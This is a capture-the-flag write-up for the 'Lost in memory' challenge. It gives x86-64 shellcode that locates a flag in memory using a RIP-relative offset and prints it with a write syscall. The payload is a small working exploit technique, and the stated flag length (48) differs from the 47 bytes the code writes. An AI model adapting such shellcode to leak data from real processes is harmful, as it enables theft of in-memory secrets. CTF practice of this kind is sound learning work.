# Lost in memory

Objective is to read the flag file.
Craft a shellcode that does a write of the flag.

Notes:
- RAX -> SYS_WRITE = 1
- RDI -> STDOUT (fd) = 1
- RSI -> address of flag
- RDX -> length of flag in bytes

- Length of stub -> 0x37
- Length of flag -> 48 (0x30)
- Length of first instructions -> 0x7 bytes.
-> 0x30 + 0x37 + 0x7 = 0x6e
These values were found in append_stub.

```asm
lea rax, [rip] ; load effective address.
sub rax, 0x6e
mov rdi, 1 ; FD (File Descriptor) for STDOUT
mov rsi, rax ; address of flag calculated above
mov rdx, 47 ; length of the flag in bytes to print
mov rax, 1 ; SYS_WRITE
syscall
```